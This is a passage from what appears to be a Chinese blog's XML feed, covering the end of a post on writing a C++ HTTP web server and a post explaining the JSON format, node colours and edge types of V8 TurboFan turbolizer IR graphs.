<p>这里要注意一点，当前连接是否继续保持<strong>取决于 isKeepAlive_ 变量</strong>。具体实现如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">HttpHandler::ERROR_TYPE <span class="title">HttpHandler::sendResponse</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span>&amp; responseCode, <span class="keyword">const</span> <span class="built_in">string</span>&amp; responseMsg, </span></span></span><br><span class="line"><span class="function"><span class="params">                            <span class="keyword">const</span> <span class="built_in">string</span>&amp; responseBodyType, <span class="keyword">const</span> <span class="built_in">string</span>&amp; responseBody)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">stringstream</span> sstream;</span><br><span class="line">    sstream &lt;&lt; <span class="string">"HTTP/1.1"</span> &lt;&lt; <span class="string">" "</span> &lt;&lt; responseCode &lt;&lt; <span class="string">" "</span> &lt;&lt; responseMsg &lt;&lt; <span class="string">"\r\n"</span>;</span><br><span class="line">    sstream &lt;&lt; <span class="string">"Connection: "</span> &lt;&lt; (isKeepAlive_ ? <span class="string">"Keep-Alive"</span> : <span class="string">"Close"</span>) &lt;&lt; <span class="string">"\r\n"</span>;</span><br><span class="line">    sstream &lt;&lt; <span class="string">"Server: WebServer/1.0"</span> &lt;&lt; <span class="string">"\r\n"</span>;</span><br><span class="line">    sstream &lt;&lt; <span class="string">"Content-length: "</span> &lt;&lt; responseBody.size() &lt;&lt; <span class="string">"\r\n"</span>;</span><br><span class="line">    sstream &lt;&lt; <span class="string">"Content-type: "</span> &lt;&lt; responseBodyType &lt;&lt; <span class="string">"\r\n"</span>;</span><br><span class="line">    sstream &lt;&lt; <span class="string">"\r\n"</span>;</span><br><span class="line">    sstream &lt;&lt; responseBody;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">string</span>&amp;&amp; response = sstream.str();</span><br><span class="line">    <span class="keyword">ssize_t</span> len = writen(client_fd_, (<span class="keyword">void</span>*)response.c_str(), response.size());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出返回的数据</span></span><br><span class="line">    LOG(INFO) &lt;&lt; <span class="string">"&lt;&lt;&lt;&lt;- Response Packet -&gt;&gt;&gt;&gt; "</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    LOG(INFO) &lt;&lt; <span class="string">"&#123;"</span> &lt;&lt; escapeStr(response) &lt;&lt; <span class="string">"&#125;"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(len &lt; <span class="number">0</span> || <span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt;(len) != response.size())</span><br><span class="line">        <span class="keyword">return</span> ERR_SEND_RESPONSE_FAIL;</span><br><span class="line">    <span class="keyword">return</span> ERR_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="8-错误处理">8. 错误处理</h3>
<p>当 handlerError 错误处理函数被调用时，在该函数内部将简单构建一个 html 错误提示页面，并将该页面发送至远程客户端。具体实现如下所示：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">HttpHandler::ERROR_TYPE <span class="title">HttpHandler::handleError</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span>&amp; errCode, <span class="keyword">const</span> <span class="built_in">string</span>&amp; errMsg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> errStr = errCode + <span class="string">" "</span> + errMsg;</span><br><span class="line">    <span class="built_in">string</span> responseBody = </span><br><span class="line">                <span class="string">"&lt;html&gt;"</span></span><br><span class="line">                <span class="string">"&lt;title&gt;"</span> + errStr + <span class="string">"&lt;/title&gt;"</span></span><br><span class="line">                <span class="string">"&lt;body&gt;"</span> + errStr + </span><br><span class="line">                    <span class="string">"&lt;hr&gt;&lt;em&gt; Kiprey's Web Server&lt;/em&gt;"</span></span><br><span class="line">                <span class="string">"&lt;/body&gt;"</span></span><br><span class="line">                <span class="string">"&lt;/html&gt;"</span>;</span><br><span class="line">    <span class="keyword">return</span> sendResponse(errCode, errMsg, <span class="string">"text/html"</span>, responseBody);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="9-事件循环（重要）">9. 事件循环（重要）</h3>
<p>HttpHandler 中的 RunEventLoop 函数维护了整个连接的事件循环。具体操作如下：</p>
<ul>
<li>首先，由于 HTTP/1.1 协议支持 持续连接，因此控制流将会进入一个 while 循环，循环进行<strong>读取请求并发送响应</strong>这样的过程。</li>
<li>while 循环内部中，首先读取来自客户端的数据，之后进行 URI 与 http header 的解析。如果上面中任何一步存在错误，则发送对应的错误页面给客户端，或者退出循环断开连接。</li>
<li>如果上述步骤没有错误，则打开目标文件，将文件数据通过 mmap 函数映射到内存，读取并发送至远程客户端。而如果目标文件不存在，则返回 404 错误；文件映射失败则返回 500 错误。</li>
<li>最后返回 while 循环头部，继续等待新的请求报文。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">HttpHandler::RunEventLoop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ERROR_TYPE err_ty;</span><br><span class="line">    LOG(INFO) &lt;&lt; <span class="string">"------------------- New Connection -------------------"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出连接</span></span><br><span class="line">    printConnectionStatus();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 持续连接</span></span><br><span class="line">    <span class="keyword">while</span>(isKeepAlive_)</span><br><span class="line">    &#123;</span><br><span class="line">        LOG(INFO) &lt;&lt; <span class="string">"&lt;&lt;&lt;&lt;- Request Packet -&gt;&gt;&gt;&gt; "</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="comment">// 从socket读取请求数据, 如果读取失败,或者断开连接</span></span><br><span class="line">        <span class="comment">// NOTE 这里的 readRequest 必须完整读取整个 http 报文</span></span><br><span class="line">        <span class="keyword">if</span>((err_ty = readRequest()) != ERR_SUCCESS)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(err_ty == ERR_READ_REQUEST_FAIL)</span><br><span class="line">                LOG(ERROR) &lt;&lt; <span class="string">"Read request failed ! "</span> &lt;&lt; strerror(errno) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(err_ty == ERR_CONNECTION_CLOSED)</span><br><span class="line">                LOG(INFO) &lt;&lt; <span class="string">"Socket("</span> &lt;&lt; client_fd_ &lt;&lt; <span class="string">") was closed."</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                assert(<span class="number">0</span> &amp;&amp; <span class="string">"UNREACHABLE"</span>);       </span><br><span class="line">            <span class="comment">// 断开连接     </span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        LOG(INFO) &lt;&lt; <span class="string">"&#123;"</span> &lt;&lt; escapeStr(request_) &lt;&lt; <span class="string">"&#125;"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 解析信息 ------------------------------------------</span></span><br><span class="line">        LOG(INFO) &lt;&lt; <span class="string">"&lt;&lt;&lt;&lt;- Request Info -&gt;&gt;&gt;&gt; "</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 先解析第一行</span></span><br><span class="line">        <span class="keyword">if</span>((err_ty = parseURI()) != ERR_SUCCESS)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(err_ty == ERR_NOT_IMPLEMENTED)</span><br><span class="line">            &#123;</span><br><span class="line">                LOG(ERROR) &lt;&lt; <span class="string">"Request method is not implemented."</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                handleError(<span class="string">"501"</span>, <span class="string">"Not Implemented"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(err_ty == ERR_HTTP_VERSION_NOT_SUPPORTED)</span><br><span class="line">            &#123;</span><br><span class="line">                LOG(ERROR) &lt;&lt; <span class="string">"Request HTTP Version Not Supported."</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                handleError(<span class="string">"505"</span>, <span class="string">"HTTP Version Not Supported"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(err_ty == ERR_BAD_REQUEST)</span><br><span class="line">            &#123;</span><br><span class="line">                LOG(ERROR) &lt;&lt; <span class="string">"Bad Request."</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                handleError(<span class="string">"400"</span>, <span class="string">"Bad Request"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                assert(<span class="number">0</span> &amp;&amp; <span class="string">"UNREACHABLE"</span>); </span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 2. 解析每一条http header</span></span><br><span class="line">        <span class="keyword">if</span>((err_ty = parseHttpHeader()) != ERR_SUCCESS)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(err_ty == ERR_BAD_REQUEST)</span><br><span class="line">            &#123;</span><br><span class="line">                LOG(ERROR) &lt;&lt; <span class="string">"Bad Request."</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                handleError(<span class="string">"400"</span>, <span class="string">"Bad Request"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                assert(<span class="number">0</span> &amp;&amp; <span class="string">"UNREACHABLE"</span>); </span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 3. 输出剩余的 HTTP body</span></span><br><span class="line">        LOG(INFO) &lt;&lt; <span class="string">"HTTP Body: &#123;"</span> </span><br><span class="line">                &lt;&lt; escapeStr(request_.substr(pos_, request_.length() - pos_)) </span><br><span class="line">                &lt;&lt; <span class="string">"&#125;"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 发送目标数据 ------------------------------------------</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 试图打开一个文件</span></span><br><span class="line">        <span class="keyword">int</span> file_fd;</span><br><span class="line">        <span class="keyword">if</span>((file_fd = open(path_.c_str(), O_RDONLY, <span class="number">0</span>)) == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 如果打开失败,则返回404</span></span><br><span class="line">            LOG(ERROR) &lt;&lt; <span class="string">"File ["</span> &lt;&lt; path_ &lt;&lt; <span class="string">"] open failed ! "</span> &lt;&lt; strerror(errno) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            handleError(<span class="string">"404"</span>, <span class="string">"Not Found"</span>); </span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 获取目标文件的大小</span></span><br><span class="line">            struct stat st;</span><br><span class="line">            <span class="keyword">if</span>(stat(path_.c_str(), &amp;st) == <span class="number">-1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                LOG(ERROR) &lt;&lt; <span class="string">"Can not get file ["</span> &lt;&lt; path_ &lt;&lt; <span class="string">"] state ! "</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                handleError(<span class="string">"500"</span>, <span class="string">"Internal Server Error"</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 读取文件, 使用 mmap 来高速读取文件</span></span><br><span class="line">            <span class="keyword">void</span>* addr = mmap(<span class="literal">nullptr</span>, st.st_size, PROT_READ, MAP_PRIVATE, file_fd, <span class="number">0</span>);</span><br><span class="line">            <span class="comment">// 记得关闭文件描述符</span></span><br><span class="line">            close(file_fd); </span><br><span class="line">            <span class="comment">// 异常处理</span></span><br><span class="line">            <span class="keyword">if</span>(addr == MAP_FAILED)</span><br><span class="line">            &#123;</span><br><span class="line">                LOG(ERROR) &lt;&lt; <span class="string">"Can not map file ["</span> &lt;&lt; path_ &lt;&lt; <span class="string">"] -&gt; mem ! "</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">                handleError(<span class="string">"500"</span>, <span class="string">"Internal Server Error"</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 将数据从内存页存入至 responseBody</span></span><br><span class="line">            <span class="keyword">char</span>* file_data_ptr = <span class="keyword">static_cast</span>&lt;<span class="keyword">char</span>*&gt;(addr);</span><br><span class="line">            <span class="function"><span class="built_in">string</span> <span class="title">responseBody</span><span class="params">(file_data_ptr, file_data_ptr + st.st_size)</span></span>;</span><br><span class="line">            <span class="comment">// 记得删除内存</span></span><br><span class="line">            <span class="keyword">int</span> res = munmap(addr, st.st_size);</span><br><span class="line">            <span class="keyword">if</span>(res == <span class="number">-1</span>)</span><br><span class="line">                LOG(ERROR) &lt;&lt; <span class="string">"Can not unmap file ["</span> &lt;&lt; path_ &lt;&lt; <span class="string">"] &lt;-&gt; mem ! "</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="comment">// 获取 Content-type</span></span><br><span class="line">            <span class="built_in">string</span> suffix = path_;</span><br><span class="line">            <span class="comment">// 通过循环找到最后一个 dot</span></span><br><span class="line">            <span class="keyword">size_t</span> dot_pos;</span><br><span class="line">            <span class="keyword">while</span>((dot_pos = suffix.find(<span class="string">'.'</span>)) != <span class="built_in">string</span>::npos)</span><br><span class="line">                suffix = suffix.substr(dot_pos + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 发送数据</span></span><br><span class="line">            <span class="keyword">if</span>(sendResponse(<span class="string">"200"</span>, <span class="string">"OK"</span>, MimeType::getMineType(suffix), responseBody) != ERR_SUCCESS)</span><br><span class="line">                LOG(ERROR) &lt;&lt; <span class="string">"Send Response failed !"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    LOG(INFO) &lt;&lt; <span class="string">"------------------ Connection Closed ------------------"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="六、编译-调试">六、编译 &amp; 调试</h2>
<p>最后简单说说编译和调试。使用<code>make</code>命令即可构建带有调试信息的 WebServer 二进制文件。这里的makefile是直接抄自 <a href="https://github.com/linyacool/WebServer/blob/master/old_version/old_version_0.1/Makefile" target="_blank" rel="noopener">linyacool/WebServer 中的 makefile</a>，并在其基础之上，修改了编译优化选项为 <code>-O0</code>，以及设置编译时附带额外的调试信息<code>-g3 -ggdb3</code>。</p>
<p><code>-g</code>所携带的调试信息可以被多个调试器所共用，而<code>-ggdb</code>所携带的调试信息是专供 gdb 使用，两者不完全等同。<code>-ggdb3</code>的调试等级甚至可以调试<strong>宏</strong>。</p>
<p>这里的调试主要是使用 <strong>gdb + pwndbg</strong> 来完成（gdb 永远的神）。因为多线程程序在gdb下调试非常的方便，它可以很快的切换线程上下文（使用<code>info &lt;threadNum&gt;</code>）以及栈帧上下文（使用<code>f &lt;frameNum&gt;</code>）；而且临时查看 <code>errno</code> 以及临时调用 <code>strerror(errno)</code>查看错误信息等等都非常地方便。</p>
]]></content>
      <categories>
        <category>Project</category>
        <category>WebServer</category>
      </categories>
      <tags>
        <tag>WebServer</tag>
      </tags>
  </entry>
  <entry>
    <title>V8 TurboFan 生成图简析</title>
    <url>/2021/04/v8TurboFan_IR_intro/</url>
    <content><![CDATA[<h2 id="一、简介">一、简介</h2>
<p>v8 turbolizer 有助于我们分析 JIT turbofan 的优化方式以及优化过程。但我们常常对于 turbolizer 生成的 IR 图一知半解，不清楚具体符号所代表的意思。以下为笔者阅读相关代码后所做的笔记。</p>
<a id="more"></a>
<h2 id="二、TurboFan-Json-格式">二、TurboFan Json 格式</h2>
<ul>
<li>
<p><code>--trace-turbo</code> 参数将会生成一个 JSON 格式的数据。通过在 turbolizer 上加载该 JSON，可以得到一个这样的IR图：<br>
<img src="/2021/04/v8TurboFan_IR_intro/image-20210429213824538.png" alt="img"></p>
</li>
<li>
<p>其中，该 JSON 的格式如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"function"</span>: <span class="string">"opt_me"</span>,</span><br><span class="line">    <span class="attr">"sourcePosition"</span>: <span class="number">109</span>,</span><br><span class="line">    <span class="attr">"source"</span>: [js source],</span><br><span class="line">    <span class="attr">"phases"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"name"</span>: <span class="string">"Typed"</span>,</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"graph"</span>,</span><br><span class="line">            <span class="attr">"data"</span>: &#123;</span><br><span class="line">                <span class="attr">"nodes"</span>: [</span><br><span class="line">                    [...],</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">"id"</span>: <span class="number">20</span>,</span><br><span class="line">                        <span class="attr">"label"</span>: <span class="string">"FrameState[INTERPRETED_FRAME, 11, Ignore, 0x1a5acd4aa5e9 &lt;SharedFunctionInfo opt_me&gt;]"</span>,</span><br><span class="line">                        <span class="attr">"title"</span>: <span class="string">"FrameState[INTERPRETED_FRAME, 11, Ignore, 0x1a5acd4aa5e9 &lt;SharedFunctionInfo opt_me&gt;]"</span>,</span><br><span class="line">                        <span class="attr">"live"</span>: <span class="literal">true</span>,</span><br><span class="line">                        <span class="attr">"properties"</span>: <span class="string">"Idempotent, NoRead, NoWrite, NoThrow, NoDeopt"</span>,</span><br><span class="line">                        <span class="attr">"pos"</span>: <span class="number">178</span>,</span><br><span class="line">                        <span class="attr">"opcode"</span>: <span class="string">"FrameState"</span>,</span><br><span class="line">                        <span class="attr">"control"</span>: <span class="literal">false</span>,</span><br><span class="line">                        <span class="attr">"opinfo"</span>: <span class="string">"5 v 0 eff 0 ctrl in, 1 v 0 eff 0 ctrl out"</span>,</span><br><span class="line">                        <span class="attr">"type"</span>: <span class="string">"Internal"</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    [...]</span><br><span class="line">                ],</span><br><span class="line">                <span class="attr">"edges"</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">"source"</span>: <span class="number">100</span>,</span><br><span class="line">                        <span class="attr">"target"</span>: <span class="number">101</span>,</span><br><span class="line">                        <span class="attr">"index"</span>: <span class="number">0</span>,</span><br><span class="line">                        <span class="attr">"type"</span>: <span class="string">"control"</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    [...]</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        [...]</span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">"nodePositions"</span>: &#123;</span><br><span class="line">        [...]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单的概括一下，就是：</p>
<ul>
<li>function： 函数名称</li>
<li>sourcePosition：代码的起始位置。</li>
<li>source： 当前 turboFan 优化的 JS 代码</li>
<li>phases： turboFan 的各个优化阶段
<ul>
<li>优化阶段1
<ul>
<li>name： 当前优化阶段的名称</li>
<li>type：显示的形式，是 <code>graph</code> IR 图还是 文本。</li>
<li>data： 当前阶段真正存放的结点与边的数据。
<ul>
<li>nodes： 结点数据
<ul>
<li>
<p>结点1</p>
<ul>
<li>
<p>id: 结点ID，通常是一个数字</p>
</li>
<li>
<p>label：结点标签</p>
</li>
<li>
<p>title：结点主题</p>
</li>
<li>
<p>live： 当前结点是否是活结点，为 true / false</p>
</li>
<li>
<p>properties：当前结点的属性</p>
</li>
<li>
<p>pos：暂且不说</p>
</li>
<li>
<p>opcode：当前结点的操作码，例如<code>End</code></p>
</li>
<li>
<p>control：当前是否是控制结点，为 true / false</p>
</li>
<li>
<p>opinfo：具体的结点信息，通常表示当前结点的<strong>ValueInputCount、EffectInputCount、ControlInputCount、ValueOutputCount、EffectOutputCount、ControlOutputCount</strong>。</p>
<blockquote>
<p>表示方式如下：</p>
<p>“&lt;ValueInputCount&gt;     v<br>
&lt;EffectInputCount&gt;    eff<br>
&lt;ControlInputCount&gt;   ctrl in,<br>
&lt;ValueOutputCount&gt;    v<br>
&lt;EffectOutputCount&gt;   eff<br>
&lt;ControlOutputCount&gt;  ctrl out”</p>
<p>例如：“0 v 1 eff 1 ctrl in, 0 v 1 eff 0 ctrl out”</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>[其他结点]</p>
</li>
</ul>
</li>
<li>edges：边的数据
<ul>
<li>边1
<ul>
<li>source：边的源节点 ID</li>
<li>target：边的目标节点ID</li>
<li>index：当前边连接到目标节点的哪个输入</li>
<li>type：当前边的类型，例如 control、value、effect等等</li>
</ul>
</li>
<li>[其他边]</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>[其他优化阶段]</li>
</ul>
</li>
<li>nodePositions：每个结点在 JS 源码中所对应的代码位置</li>
</ul>
</li>
</ul>
<h2 id="三、Node">三、Node</h2>
<h3 id="a-属性说明">a. 属性说明</h3>
<p>以下是截取出的一个 Node 示例：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"id"</span>: <span class="number">128</span>,</span><br><span class="line">    <span class="attr">"label"</span>: <span class="string">"LoadField[+16]"</span>,</span><br><span class="line">    <span class="attr">"title"</span>: <span class="string">"LoadField[tagged base, 16, Internal, kRepTaggedPointer|kTypeAny, PointerWriteBarrier]"</span>,</span><br><span class="line">    <span class="attr">"live"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"properties"</span>: <span class="string">"NoWrite, NoThrow, NoDeopt"</span>,</span><br><span class="line">    <span class="attr">"pos"</span>: <span class="number">388</span>,</span><br><span class="line">    <span class="attr">"opcode"</span>: <span class="string">"LoadField"</span>,</span><br><span class="line">    <span class="attr">"control"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">"opinfo"</span>: <span class="string">"1 v 1 eff 1 ctrl in, 1 v 1 eff 0 ctrl out"</span>,</span><br><span class="line">    <span class="attr">"type"</span>: <span class="string">"Internal"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对应的结点如下：</p>
<p><img src="/2021/04/v8TurboFan_IR_intro/image-20210429223708339.png" alt="img"></p>
<p>一一对应以下便可以看出，其中的 id、label、title、properties、opinfo 以及 type 均显现在图中。</p>
<p>而 live、pos、opcode 以及 control 字段则是给 turbolizer.js 使用的。</p>
<blockquote>
<p>注意到上图中的 “Inplace update in phase: Typed”，其中的 phase 则是 turbolizer.js 动态分析出的，不在 JSON 中记录。</p>
</blockquote>
<h3 id="b-颜色">b. 颜色</h3>
<p>我们可以注意到，IR图中的结点都有颜色，其中颜色貌似符合某种规律。</p>
<p>通过查阅 turbolizer.js 以及 在线 turbolizer 的 css 代码，turbolizer 将结点分为了以下几种结点，并设置了不同的颜色加以区分：</p>
<ul>
<li>
<p>Control 结点：对于那些控制结点， 即 JSON 数据中 control 字段为 true 的结点，其颜色为<strong>黄色</strong>。</p>
<p><img src="/2021/04/v8TurboFan_IR_intro/image-20210430000215129.png" alt="img"></p>
</li>
<li>
<p>Input 结点：那些 opcode 为 Parameter 或 Constant 结点，其颜色为<strong>浅蓝色</strong>。</p>
<p><strong><img src="/2021/04/v8TurboFan_IR_intro/image-20210430000451537.png" alt="img"></strong></p>
</li>
<li>
<p>Live 结点（<strong>这其实不能算一类结点</strong>）：即 live 字段为 true 的结点。其反向结点——DeadNode——的颜色会在原先颜色的基础上进行浅色化处理，例如以下图片。图片中的两个结点其类型相同，所不同的是左边的结点是 Dead，右边结点是 Live。</p>
<p><img src="/2021/04/v8TurboFan_IR_intro/image-20210430001053708.png" alt="img"></p>
</li>
<li>
<p>JavaScript结点：那些 opcode 以 <strong>JS</strong> 开头的结点，其颜色为<strong>橙红色</strong>。</p>
<p><img src="/2021/04/v8TurboFan_IR_intro/image-20210430001231982.png" alt="img"></p>
</li>
<li>
<p>Simplified 结点：那些 opcode 包含 <strong>Phi、Boolean、Number、String、Change、Object、Reference、Any、ToNumber、AnyToBoolean、Load、Store</strong>，但<strong>不是 JavaScript类型</strong>的结点。其颜色如下所示：</p>
<p><img src="/2021/04/v8TurboFan_IR_intro/image-20210430001623787.png" alt="img"></p>
</li>
<li>
<p>Machine 结点：除了上述四种结点以外，剩余的结点。颜色如下所示：</p>
<p><img src="/2021/04/v8TurboFan_IR_intro/image-20210430001755202.png" alt="img"></p>
</li>
</ul>
<h2 id="四、Edge">四、Edge</h2>
<p>Edge 中的 Type 共有五种，分别是 <strong>value</strong>、<strong>context</strong>、<strong>frame-state</strong>、<strong>effect</strong>、<strong>control</strong> 以及最后一个 unknown。</p>
<p>以下是这些边的一些例子：</p>
<h3 id="a-value-边">a. value 边</h3>
<p>对于该边：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"source"</span>: <span class="number">80</span>,</span><br><span class="line">    <span class="attr">"target"</span>: <span class="number">83</span>,</span><br><span class="line">    <span class="attr">"index"</span>: <span class="number">4</span>,</span><br><span class="line">    <span class="attr">"type"</span>: <span class="string">"value"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其边的视觉效果如下：</p>
<p><img src="/2021/04/v8TurboFan_IR_intro/image-20210429230418329.png" alt="img"></p>
<p>可以看到，对于 <strong>Value 边</strong>来说，是一条<strong>实线</strong>。</p>
<h3 id="b-context-边">b. context 边</h3>
<p>对于该边：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"source"</span>: <span class="number">4</span>,</span><br><span class="line">    <span class="attr">"target"</span>: <span class="number">49</span>,</span><br><span class="line">    <span class="attr">"index"</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="attr">"type"</span>: <span class="string">"context"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>视觉效果如下：</p>
<p><img src="/2021/04/v8TurboFan_IR_intro/image-20210429231008606.png" alt="img"></p>
<p>可以看到，<strong>Context边</strong>也是一条<strong>实线</strong>。但在当前这个例子中，由于 Context 边只会由 <code>Parameter[%context#4]</code>结点发出，因此<strong>不会与 Value 边混淆</strong>。</p>
<p>这里需要注意一下，Context 边只会存在于某个 Context 结点发出的所有边，即不会出现结点既发出 Context 边又发出 Value 边的情况。</p>
<blockquote>
<p>如果有还请指正。</p>
</blockquote>
<h3 id="c-frame-state-边">c. frame-state 边</h3>
<p>例子：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"source"</span>: <span class="number">50</span>,</span><br><span class="line">    <span class="attr">"target"</span>: <span class="number">49</span>,</span><br><span class="line">    <span class="attr">"index"</span>: <span class="number">4</span>,</span><br><span class="line">    <span class="attr">"type"</span>: <span class="string">"frame-state"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>视觉效果：</p>
<p><img src="/2021/04/v8TurboFan_IR_intro/image-20210429232323942.png" alt="img"></p>
<p>可以看到，对于一条 <strong>frame-state 边</strong>，其视觉效果是一条 <strong>疏虚线</strong>。</p>
<p>frame-state 边一定是由一个 FrameState 结点发出的。</p>
<blockquote>
<p>上图的另一条虚线是<strong>密虚线</strong>，所不同的是虚线的<strong>疏密程度</strong>。</p>
</blockquote>
<h3 id="d-effect-边">d. effect 边</h3>
<p>例子：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"source"</span>: <span class="number">114</span>,</span><br><span class="line">    <span class="attr">"target"</span>: <span class="number">49</span>,</span><br><span class="line">    <span class="attr">"index"</span>: <span class="number">5</span>,</span><br><span class="line">    <span class="attr">"type"</span>: <span class="string">"effect"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>视觉效果：</p>
<p><img src="/2021/04/v8TurboFan_IR_intro/image-20210429232831969.png" alt="img"></p>
<p>即 <strong>effect 边</strong>的显示效果是 <strong>密虚线</strong>。</p>
<h3 id="e-control-边">e. control 边</h3>
<p>例子：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"source"</span>: <span class="number">31</span>,</span><br><span class="line">    <span class="attr">"target"</span>: <span class="number">49</span>,</span><br><span class="line">    <span class="attr">"index"</span>: <span class="number">6</span>,</span><br><span class="line">    <span class="attr">"type"</span>: <span class="string">"control"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>视觉效果：</p>
<p><img src="/2021/04/v8TurboFan_IR_intro/image-20210429233143544.png" alt="img"></p>
<p>注意：与 value 边相同，<strong>control 边</strong>的显示效果也是一条<strong>实线</strong>。这意味着单单只看 IR 图的话，是无法将 Control 边和 Value 边区分开的。</p>
<h2 id="五、参考的源码">五、参考的源码</h2>
<ul>
<li>v8/tools/turbolizer/build/turbolizer.js</li>
<li>v8/src/compiler/graph-visualizer.cc</li>
</ul>
]]></content>
      <tags>
        <tag>v8</tag>
      </tags>
  </entry>
  <entry>
    <title>WSL64 运行 32 位程序</title>
    <url>/2021/04/i386_WSL64/</url>
